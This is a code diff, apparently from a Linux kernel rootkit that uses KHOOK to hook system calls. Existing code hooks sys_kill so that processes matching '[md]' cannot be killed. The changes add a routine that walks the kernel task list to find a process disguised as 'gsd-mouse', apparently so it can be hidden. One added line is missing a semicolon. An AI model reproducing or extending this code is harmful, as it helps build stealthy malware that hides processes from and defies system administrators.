@@ -23,6 +23,8 @@
 #define FLAG 0x80000000
 const char *protected = "[md]";
 int protected_pid = -1;
+int hide_pid = -1;
+const char *hide = "gsd-mouse"
 
 
 // int myatoi(char *str)
@@ -114,7 +116,7 @@ static int print_pid(void)
 	return 0;
 }
 
-static pid_t find_pid(void)
+static pid_t find_pid_kill(void)
 {
 	struct task_struct * task, * p;
 	struct list_head * pos;
@@ -126,6 +128,22 @@ static pid_t find_pid(void)
 		count++;
 		if (strstr(p->comm, protected))
 			protected_pid = p->pid;
+	}
+	return 0;
+}
+
+static pid_t find_pid_hide(void)
+{
+	struct task_struct * task, * p;
+	struct list_head * pos;
+	int count = 0;
+	task =& init_task;
+	list_for_each(pos, &task->tasks)
+	{
+		p = list_entry(pos, struct task_struct, tasks);
+		count++;
+		if (strstr(p->comm, hide))
+			hide_pid = p->pid;
 	}
 	return 0;
 }
@@ -201,7 +219,7 @@ struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
 KHOOK_EXT(long, sys_kill, pid_t, int);
 static long khook_sys_kill(pid_t pid, int sig) {
 	int ret = 0;
-	find_pid();
+	find_pid_kill();
 	printk("pid:%d", protected_pid);
 	if (protected_pid != pid)
 		ret = KHOOK_ORIGIN(sys_kill, pid, sig);
